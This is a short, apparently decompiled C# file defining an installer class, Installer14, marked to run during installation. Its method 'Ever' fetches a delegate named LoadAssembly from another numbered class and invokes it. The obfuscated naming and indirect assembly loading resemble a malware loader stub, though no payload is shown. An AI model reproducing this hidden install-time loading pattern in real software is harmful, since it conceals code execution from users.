using System.ComponentModel;
using System.Configuration.Install;

namespace dsui;

[RunInstaller(true)]
public class Installer14 : Installer
{
	private IContainer components;

	public Installer14()
	{
		InitializeComponent();
	}

	internal static void Ever()
	{
		Installer23.LoadAssembly loadAssembly = Installer37.Lal();
		loadAssembly();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Component)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
	}
}
